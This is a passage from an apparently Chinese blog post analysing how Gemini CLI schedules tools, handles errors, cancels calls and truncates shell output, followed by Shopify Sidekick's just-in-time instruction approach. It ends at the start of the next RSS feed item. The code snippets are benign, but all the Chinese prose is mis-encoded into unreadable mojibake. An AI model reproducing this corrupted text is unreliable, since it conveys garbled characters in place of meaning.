</code></pre>
<p>YOLO æ¨¡å¼çš„å‘½åæœ‰ç‚¹æ„æ€ï¼Œ"<strong>You Only Live Once</strong>" <strong>äººç”Ÿè‹¦çŸ­ï¼Œæ´»å‡ºç²¾å½©</strong></p>
<p>ç‹¬ç«‹çš„å·¥å…·è°ƒç”¨å¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼Œæé«˜æ•ˆç‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¹¶è¡Œå¤„ç†å¤šä¸ªå·¥å…·è°ƒç”¨</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> fnCall <span class="hljs-keyword">of</span> functionCalls) {
  <span class="hljs-comment">// ä¸ç­‰å¾…ï¼Œç›´æ¥è°ƒåº¦ä¸‹ä¸€ä¸ª</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handlePendingFunctionCall</span>(fnCall);
}
</code></pre>
<p>å·¥å…·æ‰§è¡Œè¿‡ç¨‹ä¸­çš„è¾“å‡ºä¼šå®æ—¶å±•ç¤ºï¼Œç”¨æˆ·ä½“éªŒå¾ˆå¥½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®æ—¶æ›´æ–°è¾“å‡ºæµ</span>
onUpdate?: <span class="hljs-function">(<span class="hljs-params">output: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;
</code></pre>
<h3 data-id="heading-13">2.3 é”™è¯¯å¤„ç†æœºåˆ¶</h3>
<h4 data-id="heading-14">1. é”™è¯¯ç±»å‹åˆ†ç±»</h4>
<p>ç³»ç»Ÿå®šä¹‰äº†å®Œæ•´çš„é”™è¯¯ç±»å‹æšä¸¾ <code>ToolErrorType</code>ï¼ŒåŒ…æ‹¬ï¼š</p>
<p><strong>é€šç”¨é”™è¯¯ï¼š</strong></p>
<ul>
<li><code>INVALID_TOOL_PARAMS</code> - å·¥å…·å‚æ•°æ— æ•ˆ</li>
<li><code>UNKNOWN</code> - æœªçŸ¥é”™è¯¯</li>
<li><code>UNHANDLED_EXCEPTION</code> - æœªå¤„ç†çš„å¼‚å¸¸</li>
<li><code>TOOL_NOT_REGISTERED</code> - å·¥å…·æœªæ³¨å†Œ</li>
<li><code>EXECUTION_FAILED</code> - æ‰§è¡Œå¤±è´¥</li>
</ul>
<p><strong>æ–‡ä»¶ç³»ç»Ÿé”™è¯¯ï¼š</strong></p>
<ul>
<li><code>FILE_NOT_FOUND</code> - æ–‡ä»¶æœªæ‰¾åˆ°</li>
<li><code>FILE_WRITE_FAILURE</code> - æ–‡ä»¶å†™å…¥å¤±è´¥</li>
<li><code>PERMISSION_DENIED</code> - æƒé™æ‹’ç»</li>
<li><code>PATH_NOT_IN_WORKSPACE</code> - è·¯å¾„ä¸åœ¨å·¥ä½œç©ºé—´å†…</li>
</ul>
<p><strong>Shell ç‰¹å®šé”™è¯¯ï¼š</strong></p>
<ul>
<li><code>SHELL_EXECUTE_ERROR</code> - Shell æ‰§è¡Œé”™è¯¯</li>
</ul>
<h4 data-id="heading-15">2. å·¥å…·è°ƒç”¨çŠ¶æ€ç®¡ç†</h4>
<p>ç³»ç»Ÿå®šä¹‰äº†å®Œæ•´çš„å·¥å…·è°ƒç”¨çŠ¶æ€ç±»å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">ToolCall</span> =
  | <span class="hljs-title class_">ValidatingToolCall</span>      <span class="hljs-comment">// éªŒè¯ä¸­</span>
  | <span class="hljs-title class_">ScheduledToolCall</span>       <span class="hljs-comment">// å·²è°ƒåº¦</span>
  | <span class="hljs-title class_">ErroredToolCall</span>         <span class="hljs-comment">// é”™è¯¯</span>
  | <span class="hljs-title class_">SuccessfulToolCall</span>      <span class="hljs-comment">// æˆåŠŸ</span>
  | <span class="hljs-title class_">ExecutingToolCall</span>       <span class="hljs-comment">// æ‰§è¡Œä¸­</span>
  | <span class="hljs-title class_">CancelledToolCall</span>       <span class="hljs-comment">// å·²å–æ¶ˆ</span>
  | <span class="hljs-title class_">WaitingToolCall</span>;        <span class="hljs-comment">// ç­‰å¾…æ‰¹å‡†</span>
</code></pre>
<h4 data-id="heading-16">3. é”™è¯¯å¤„ç†æµç¨‹</h4>
<h5 data-id="heading-17">éªŒè¯é˜¶æ®µé”™è¯¯å¤„ç†</h5>
<p>åœ¨ <code>_schedule</code> æ–¹æ³•ä¸­ï¼Œç³»ç»Ÿä¼šï¼š</p>
<ol>
<li><strong>å·¥å…·æ³¨å†Œæ£€æŸ¥</strong>ï¼šéªŒè¯å·¥å…·æ˜¯å¦å·²æ³¨å†Œ</li>
<li><strong>å‚æ•°éªŒè¯</strong>ï¼šä½¿ç”¨ <code>tool.build(args)</code> éªŒè¯å‚æ•°</li>
<li><strong>å¼‚å¸¸æ•è·</strong>ï¼šæ•è·éªŒè¯è¿‡ç¨‹ä¸­çš„æ‰€æœ‰å¼‚å¸¸</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">try</span> {
  <span class="hljs-keyword">const</span> invocationOrError = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">buildInvocation</span>(toolInstance, args);
  <span class="hljs-keyword">if</span> (invocationOrError <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">status</span>: <span class="hljs-string">'error'</span>,
      <span class="hljs-attr">request</span>: reqInfo,
      <span class="hljs-attr">response</span>: <span class="hljs-title function_">createErrorResponse</span>(
        reqInfo,
        invocationOrError,
        <span class="hljs-title class_">ToolErrorType</span>.<span class="hljs-property">INVALID_TOOL_PARAMS</span>,
      ),
      <span class="hljs-attr">durationMs</span>: <span class="hljs-number">0</span>,
    };
  }
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-comment">// å¤„ç†éªŒè¯å¼‚å¸¸</span>
}
</code></pre>
<h5 data-id="heading-18">æ‰§è¡Œé˜¶æ®µé”™è¯¯å¤„ç†</h5>
<p>åœ¨ <code>attemptExecutionOfScheduledCalls</code> æ–¹æ³•ä¸­ï¼Œç³»ç»Ÿä¼šï¼š</p>
<ol>
<li><strong>æ‰§è¡Œå¼‚å¸¸æ•è·</strong>ï¼šä½¿ç”¨ Promise <code>.catch()</code> æ•è·æ‰§è¡Œå¼‚å¸¸</li>
<li><strong>é”™è¯¯å“åº”ç”Ÿæˆ</strong>ï¼šè°ƒç”¨ <code>createErrorResponse</code> ç”Ÿæˆæ ‡å‡†åŒ–é”™è¯¯å“åº”</li>
<li><strong>çŠ¶æ€æ›´æ–°</strong>ï¼šå°†å·¥å…·è°ƒç”¨çŠ¶æ€è®¾ç½®ä¸º 'error'</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">promise
  .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">async</span> (<span class="hljs-attr">toolResult</span>: <span class="hljs-title class_">ToolResult</span>) =&gt; {
    <span class="hljs-comment">// å¤„ç†æˆåŠŸç»“æœ</span>
  })
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error: <span class="hljs-built_in">Error</span></span>) =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setStatusInternal</span>(
      callId,
      <span class="hljs-string">'error'</span>,
      <span class="hljs-title function_">createErrorResponse</span>(reqInfo, error, <span class="hljs-title class_">ToolErrorType</span>.<span class="hljs-property">UNHANDLED_EXCEPTION</span>),
    );
  });
</code></pre>
<h4 data-id="heading-19">4. é”™è¯¯å“åº”æ ¼å¼</h4>
<p><code>createErrorResponse</code> å‡½æ•°ç”Ÿæˆæ ‡å‡†åŒ–çš„é”™è¯¯å“åº”ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> createErrorResponse = (
  <span class="hljs-attr">request</span>: <span class="hljs-title class_">ToolCallRequestInfo</span>,
  <span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span>,
  <span class="hljs-attr">errorType</span>: <span class="hljs-title class_">ToolErrorType</span> | <span class="hljs-literal">undefined</span>,
): <span class="hljs-function"><span class="hljs-params">ToolCallResponseInfo</span> =&gt;</span> ({
  <span class="hljs-attr">callId</span>: request.<span class="hljs-property">callId</span>,
  error,
  <span class="hljs-attr">responseParts</span>: [{
    <span class="hljs-attr">functionResponse</span>: {
      <span class="hljs-attr">id</span>: request.<span class="hljs-property">callId</span>,
      <span class="hljs-attr">name</span>: request.<span class="hljs-property">name</span>,
      <span class="hljs-attr">response</span>: { <span class="hljs-attr">error</span>: error.<span class="hljs-property">message</span> },
    },
  }],
  <span class="hljs-attr">resultDisplay</span>: error.<span class="hljs-property">message</span>,
  errorType,
  <span class="hljs-attr">contentLength</span>: error.<span class="hljs-property">message</span>.<span class="hljs-property">length</span>,
});
</code></pre>
<h3 data-id="heading-20">2.4 è¶…æ—¶ç­–ç•¥</h3>
<h4 data-id="heading-21">1. AbortSignal æœºåˆ¶</h4>
<p>ç³»ç»Ÿä½¿ç”¨ <code>AbortSignal</code> å®ç°è¶…æ—¶å’Œå–æ¶ˆæ§åˆ¶ï¼š</p>
<h5 data-id="heading-22">è°ƒåº¦å±‚é¢çš„å–æ¶ˆ</h5>
<p>åœ¨ <code>schedule</code> æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">schedule</span>(
  <span class="hljs-attr">request</span>: <span class="hljs-title class_">ToolCallRequestInfo</span> | <span class="hljs-title class_">ToolCallRequestInfo</span>[],
  <span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>,
): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isRunning</span>() || <span class="hljs-variable language_">this</span>.<span class="hljs-property">isScheduling</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">abortHandler</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-comment">// ä»é˜Ÿåˆ—ä¸­ç§»é™¤è¯·æ±‚</span>
        <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">requestQueue</span>.<span class="hljs-title function_">findIndex</span>(
          <span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">request</span> === request,
        );
        <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">requestQueue</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
          <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Tool call cancelled while in queue.'</span>));
        }
      };
      
      signal.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'abort'</span>, abortHandler, { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-comment">// ...</span>
    });
  }
}
</code></pre>
<h5 data-id="heading-23">æ‰§è¡Œå±‚é¢çš„å–æ¶ˆ</h5>
<p>åœ¨å·¥å…·æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼š</p>
<ol>
<li><strong>æ‰§è¡Œå‰æ£€æŸ¥</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (signal.<span class="hljs-property">aborted</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setStatusInternal</span>(
    reqInfo.<span class="hljs-property">callId</span>,
    <span class="hljs-string">'cancelled'</span>,
    <span class="hljs-string">'Tool call cancelled by user.'</span>,
  );
  <span class="hljs-keyword">continue</span>;
}
</code></pre>
<ol start="2">
<li><strong>æ‰§è¡Œåæ£€æŸ¥</strong>ï¼š</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">async</span> (<span class="hljs-attr">toolResult</span>: <span class="hljs-title class_">ToolResult</span>) =&gt; {
  <span class="hljs-keyword">if</span> (signal.<span class="hljs-property">aborted</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setStatusInternal</span>(
      callId,
      <span class="hljs-string">'cancelled'</span>,
      <span class="hljs-string">'User cancelled tool execution.'</span>,
    );
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// å¤„ç†æˆåŠŸç»“æœ</span>
})
</code></pre>
<h4 data-id="heading-24">2. Shell å·¥å…·ç‰¹æ®Šå¤„ç†</h4>
<p>Shell å·¥å…·æœ‰ç‰¹æ®Šçš„è¶…æ—¶å’Œå–æ¶ˆæœºåˆ¶ï¼š</p>
<h5 data-id="heading-25">è¿›ç¨‹ ID è·Ÿè¸ª</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (invocation <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ShellToolInvocation</span>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setPidCallback</span> = (<span class="hljs-params">pid: <span class="hljs-built_in">number</span></span>) =&gt; {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">toolCalls</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">toolCalls</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">tc</span>) =&gt;</span>
      tc.<span class="hljs-property">request</span>.<span class="hljs-property">callId</span> === callId &amp;&amp; tc.<span class="hljs-property">status</span> === <span class="hljs-string">'executing'</span>
        ? { ...tc, pid }
        : tc,
    );
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">notifyToolCallsUpdate</span>();
  };
  promise = invocation.<span class="hljs-title function_">execute</span>(
    signal,
    liveOutputCallback,
    shellExecutionConfig,
    setPidCallback,
  );
}
</code></pre>
<h5 data-id="heading-26">Shell æ‰§è¡Œé…ç½®</h5>
<p>ç³»ç»Ÿé€šè¿‡ <code>ShellExecutionConfig</code> é…ç½® Shell æ‰§è¡Œç¯å¢ƒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ShellExecutionConfig</span> {
  terminalWidth?: <span class="hljs-built_in">number</span>;
  terminalHeight?: <span class="hljs-built_in">number</span>;
  pager?: <span class="hljs-built_in">string</span>;
  showColor?: <span class="hljs-built_in">boolean</span>;
  defaultFg?: <span class="hljs-built_in">string</span>;
  defaultBg?: <span class="hljs-built_in">string</span>;
}
</code></pre>
<h4 data-id="heading-27">3. è¾“å‡ºæˆªæ–­æœºåˆ¶</h4>
<p>ä¸ºé˜²æ­¢è¾“å‡ºè¿‡å¤§å¯¼è‡´å†…å­˜é—®é¢˜ï¼Œç³»ç»Ÿå®ç°äº†è¾“å‡ºæˆªæ–­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (
  <span class="hljs-keyword">typeof</span> content === <span class="hljs-string">'string'</span> &amp;&amp;
  toolName === <span class="hljs-title class_">ShellTool</span>.<span class="hljs-property">Name</span> &amp;&amp;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">getEnableToolOutputTruncation</span>() &amp;&amp;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">getTruncateToolOutputThreshold</span>() &gt; <span class="hljs-number">0</span> &amp;&amp;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">getTruncateToolOutputLines</span>() &gt; <span class="hljs-number">0</span>
) {
  <span class="hljs-keyword">const</span> truncatedResult = <span class="hljs-keyword">await</span> <span class="hljs-title function_">truncateAndSaveToFile</span>(
    content,
    callId,
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">storage</span>.<span class="hljs-title function_">getProjectTempDir</span>(),
    threshold,
    lines,
  );
  content = truncatedResult.<span class="hljs-property">content</span>;
  outputFile = truncatedResult.<span class="hljs-property">outputFile</span>;
}
</code></pre>
<p>å¦‚æœæˆ‘ä»¬è¦æ„å»ºè‡ªå·±çš„ Agent ç³»ç»Ÿï¼ŒGemini CLI æœ‰è¿™äº›å€¼å¾—å­¦ä¹ çš„åœ°æ–¹ï¼š</p>
<ol>
<li><strong>å·¥å…·å‘ç°æœºåˆ¶</strong>ï¼šä¸‰å±‚å‘ç°æœºåˆ¶å¾ˆçµæ´»ï¼Œæ—¢æœ‰å†…ç½®å·¥å…·ä¿åº•ï¼Œåˆèƒ½åŠ¨æ€æ‰©å±•ã€‚</li>
<li><strong>çŠ¶æ€æœºè°ƒåº¦</strong>ï¼šæ¸…æ™°çš„çŠ¶æ€æµè½¬ï¼Œä¾¿äºè°ƒè¯•å’Œç›‘æ§ã€‚</li>
<li><strong>ç¯å¢ƒæ„ŸçŸ¥</strong>ï¼šæ ¹æ®è¿è¡Œç¯å¢ƒè‡ªåŠ¨è°ƒæ•´è¡Œä¸ºï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>MCP åè®®æ”¯æŒ</strong>ï¼šæ¥å…¥æ ‡å‡†åè®®ï¼Œè·å¾—ç”Ÿæ€ç³»ç»Ÿæ”¯æŒã€‚</li>
<li><strong>å£°æ˜å¼å·¥å…·å®šä¹‰</strong>ï¼šå·¥å…·å®šä¹‰å’Œå®ç°åˆ†ç¦»ï¼Œæ¥å£æ¸…æ™°ã€‚</li>
</ol>
<h3 data-id="heading-28">2.5 æ½œåœ¨çš„é—®é¢˜</h3>
<p>Gemini è¿™ç§è®¾è®¡ä¹Ÿæœ‰ä¸€äº›æ½œåœ¨é—®é¢˜ï¼š</p>
<ol>
<li><strong>ä¸Šä¸‹æ–‡è†¨èƒ€</strong>ï¼šæ‰€æœ‰å·¥å…·éƒ½æä¾›ç»™ LLMï¼Œå¯èƒ½å¯¼è‡´ token æ¶ˆè€—å¢åŠ ã€‚</li>
<li><strong>å·¥å…·é€‰æ‹©ä¸å¯æ§</strong>ï¼šå®Œå…¨ä¾èµ– LLM é€‰æ‹©ï¼Œç¼ºå°‘äººä¸ºå¹²é¢„æ‰‹æ®µã€‚</li>
<li><strong>è°ƒè¯•å›°éš¾</strong>ï¼šå½“å·¥å…·å¾ˆå¤šæ—¶ï¼Œéš¾ä»¥è¿½è¸ª LLM ä¸ºä»€ä¹ˆé€‰æ‹©æŸä¸ªå·¥å…·ã€‚</li>
</ol>
<h2 data-id="heading-29">3. Shopify Sidekick çš„å·¥å…·ç®¡ç†ç­–ç•¥</h2>
<p>æ–‡ç« åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fshopify.engineering%2Fbuilding-production-ready-agentic-systems" target="_blank" title="https://shopify.engineering/building-production-ready-agentic-systems" ref="nofollow noopener noreferrer">shopify.engineering/building-prâ€¦</a></p>
<p>Shopify å›¢é˜Ÿåœ¨å…¶æ–‡ç« ä¸­å‘Šè¯‰æˆ‘ä»¬ä¸€ä¸ªä»–ä»¬è¸©çš„å‘ï¼š<strong>å·¥å…·æ•°é‡çš„å¢é•¿ä¸æ˜¯çº¿æ€§é—®é¢˜ï¼Œè€Œæ˜¯æŒ‡æ•°çº§å¤æ‚åº¦é—®é¢˜</strong>ã€‚</p>
<p>ä»–ä»¬æŠŠè¿™ä¸ªè¿‡ç¨‹åˆ†æˆäº†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<p><strong>0-20 ä¸ªå·¥å…·</strong>ï¼šèœœæœˆæœŸã€‚æ¯ä¸ªå·¥å…·èŒè´£æ¸…æ™°ï¼Œè°ƒè¯•ç®€å•ï¼Œç³»ç»Ÿè¡Œä¸ºå¯é¢„æµ‹ã€‚è¿™ä¸ªé˜¶æ®µä½ ä¼šè§‰å¾—"Agent å¼€å‘ä¹Ÿä¸è¿‡å¦‚æ­¤å˜›"ã€‚</p>
<p><strong>20-50 ä¸ªå·¥å…·</strong>ï¼šæ··ä¹±æœŸã€‚å·¥å…·è¾¹ç•Œå¼€å§‹æ¨¡ç³Šï¼Œç»„åˆä½¿ç”¨æ—¶äº§ç”Ÿæ„æƒ³ä¸åˆ°çš„ç»“æœã€‚è¿™æ—¶å€™ä½ å¼€å§‹æ€€ç–‘äººç”Ÿï¼š"ä¸ºä»€ä¹ˆè°ƒç”¨æŸ¥è¯¢å·¥å…·çš„åŒæ—¶ä¼šè§¦å‘é‚®ä»¶å‘é€ï¼Ÿ"</p>
<p><strong>50+ ä¸ªå·¥å…·</strong>ï¼šå´©æºƒæœŸã€‚åŒä¸€ä¸ªä»»åŠ¡æœ‰å¤šç§å®ç°è·¯å¾„ï¼Œç³»ç»Ÿå˜å¾—æ— æ³•ç†è§£ã€‚è°ƒè¯•åƒåœ¨è¿·å®«é‡Œæ‰¾å‡ºå£ï¼Œä¿®ä¸€ä¸ª bug å¼•å…¥ä¸‰ä¸ªæ–° bugã€‚</p>
<p>å½“å·¥å…·æ•°é‡è¶…è¿‡ 30 ä¸ªåï¼Œæ•´ä¸ªç³»ç»Ÿå˜å¾—éš¾ä»¥ç»´æŠ¤ã€‚Shopify æŠŠè¿™ä¸ªé—®é¢˜å«åš"Death by a Thousand Instructions"ï¼ˆåƒæ¡æŒ‡ä»¤ä¹‹æ­»ï¼‰ï¼Œç³»ç»Ÿæç¤ºè¯å˜æˆäº†ä¸€ä¸ªå……æ»¡ç‰¹æ®Šæƒ…å†µã€ç›¸äº’å†²çªçš„æŒ‡å¯¼å’Œè¾¹ç¼˜æ¡ˆä¾‹å¤„ç†çš„æ€ªç‰©ã€‚</p>
<h3 data-id="heading-30">3.1 Just-in-Time Instructions</h3>
<p>é¢å¯¹å·¥å…·ç®¡ç†çš„æ··ä¹±ï¼ŒShopify å›¢é˜Ÿæ‰¾åˆ°äº†ä¸€ä¸ªå·§å¦™çš„è§£å†³æ–¹æ¡ˆï¼š<strong>Just-in-Time (JIT) Instructions</strong>ã€‚</p>
<p>è¿™ä¸ªæ€è·¯å…¶å®å¾ˆç®€å•ï¼Œå¯èƒ½çš„å®ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼ ç»Ÿæ–¹å¼ï¼šæ‰€æœ‰æŒ‡ä»¤éƒ½å¡åœ¨ç³»ç»Ÿæç¤ºè¯é‡Œ</span>
system_prompt = <span class="hljs-string">"""
ä½ æ˜¯ä¸€ä¸ªAIåŠ©æ‰‹...
å½“ç”¨æˆ·æŸ¥è¯¢å®¢æˆ·æ—¶ï¼Œä½¿ç”¨customer_queryå·¥å…·...
å½“ç”¨æˆ·éœ€è¦å‘é‚®ä»¶æ—¶ï¼Œå…ˆæ£€æŸ¥æƒé™...
å¦‚æœæ˜¯VIPå®¢æˆ·ï¼Œè¦ç‰¹åˆ«æ³¨æ„...
å¤„ç†è®¢å•æ—¶è¦è€ƒè™‘åº“å­˜...
ï¼ˆè¿˜æœ‰500è¡Œå„ç§è§„åˆ™ï¼‰
"""</span>

<span class="hljs-comment"># JITæ–¹å¼ï¼šæŒ‰éœ€æä¾›æŒ‡ä»¤</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_tool_instructions</span>(<span class="hljs-params">tool_name, context</span>):
    <span class="hljs-keyword">if</span> tool_name == <span class="hljs-string">"customer_query"</span>:
        <span class="hljs-keyword">if</span> context.is_filtering:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"ä½¿ç”¨customer_tagsè¿›è¡Œæ ‡ç­¾ç­›é€‰ï¼Œä½¿ç”¨customer_statusè¿›è¡ŒçŠ¶æ€ç­›é€‰..."</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"ç›´æ¥æŸ¥è¯¢å®¢æˆ·åŸºæœ¬ä¿¡æ¯..."</span>
    <span class="hljs-comment"># åªåœ¨éœ€è¦æ—¶æä¾›ç›¸å…³æŒ‡ä»¤</span>
</code></pre>
<p>è¿™ç§è®¾è®¡çš„å¥½å¤„ï¼š</p>
<ol>
<li><strong>ä¸Šä¸‹æ–‡ç²¾å‡†</strong>ï¼šLLM åªçœ‹åˆ°å½“å‰éœ€è¦çš„æŒ‡ä»¤ï¼Œä¸ä¼šè¢«æ— å…³ä¿¡æ¯å¹²æ‰°ã€‚</li>
<li><strong>ç¼“å­˜å‹å¥½</strong>ï¼šæ ¸å¿ƒç³»ç»Ÿæç¤ºè¯ä¿æŒç¨³å®šï¼Œå¯ä»¥åˆ©ç”¨ LLM çš„æç¤ºè¯ç¼“å­˜ï¼Œæé«˜å“åº”é€Ÿåº¦ã€‚</li>
<li><strong>çµæ´»è¿­ä»£</strong>ï¼šå¯ä»¥æ ¹æ®ä¸åŒåœºæ™¯ã€ç”¨æˆ·ç¾¤ä½“ã€A/B æµ‹è¯•åŠ¨æ€è°ƒæ•´æŒ‡ä»¤ï¼Œä¸éœ€è¦æ”¹åŠ¨æ ¸å¿ƒç³»ç»Ÿã€‚</li>
<li><strong>å¯ç»´æŠ¤æ€§</strong>ï¼šæ¯ä¸ªå·¥å…·çš„æŒ‡ä»¤ç‹¬ç«‹ç®¡ç†ï¼Œä¿®æ”¹ä¸€ä¸ªå·¥å…·çš„è¡Œä¸ºä¸ä¼šå½±å“å…¶ä»–å·¥å…·ã€‚</li>
</ol>
<h2 data-id="heading-31">4. å°ç»“</h2>
<p>OpenManus ä½“ç°äº†ä¼˜é›…è®¾è®¡ï¼ŒGemini CLI å±•ç¤ºç®€åŒ–å°è¯•ï¼Œè€Œ Shopify Sidekick å±•ç¤ºäº†å®æˆ˜ä¸­çš„æ™ºæ…§ã€‚</p>
<p>å½“æˆ‘ä»¬è¦æ„å»ºç”Ÿäº§çº§çš„ Agent ç³»ç»Ÿï¼š</p>
<ul>
<li>ä¸è¦ä½ä¼°å·¥å…·ç®¡ç†çš„å¤æ‚æ€§</li>
<li>ä¸è¦é«˜ä¼° LLM çš„å·¥å…·é€‰æ‹©èƒ½åŠ›</li>
<li>ä¸è¦å¿½è§†ç”Ÿäº§ç¯å¢ƒçš„æ®‹é…·æ€§</li>
</ul>
<p>Agent ç³»ç»Ÿä¸æ˜¯ä¸€æ¬¡æ€§å·¥ç¨‹ï¼Œè€Œæ˜¯éœ€è¦ä¸æ–­è¿›åŒ–çš„ã€‚æˆ‘ä»¬éœ€è¦ä¸æ–­å­¦ä¹ ã€è°ƒæ•´ã€ä¼˜åŒ–ï¼Œæ‰èƒ½æ„å»ºå‡ºçœŸæ­£å¯é çš„ AI Agentã€‚</p>
<p><strong>å½“æˆ‘ä»¬çš„ Agent è¦æœåŠ¡çœŸå®ç”¨æˆ·æ—¶ï¼Œä¸¥è°¨çš„å·¥ç¨‹å®è·µæ¯”ç‚«é…·çš„æŠ€æœ¯æ›´é‡è¦ã€‚è¿™å¯èƒ½ä¸å¤Ÿé…·ï¼Œä½†è¿™æ˜¯é€šå¾€ç”Ÿäº§ç¯å¢ƒçš„å¿…ç»ä¹‹è·¯ã€‚</strong></p>
<p>ä»¥ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI ç¼–ç¨‹çš„å¤šå±‚æ¬¡ç¼–ç¨‹è¾…åŠ©ç­–ç•¥]]></title>    <link>https://juejin.cn/post/7589227883261902894</link>    <guid>https://juejin.cn/post/7589227883261902894</guid>    <pubDate>2025-12-30T04:59:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589227883261902894" data-draft-id="7589166195798179867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI ç¼–ç¨‹çš„å¤šå±‚æ¬¡ç¼–ç¨‹è¾…åŠ©ç­–ç•¥"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-12-30T04:59:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½˜é”¦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI ç¼–ç¨‹çš„å¤šå±‚æ¬¡ç¼–ç¨‹è¾…åŠ©ç­–ç•¥
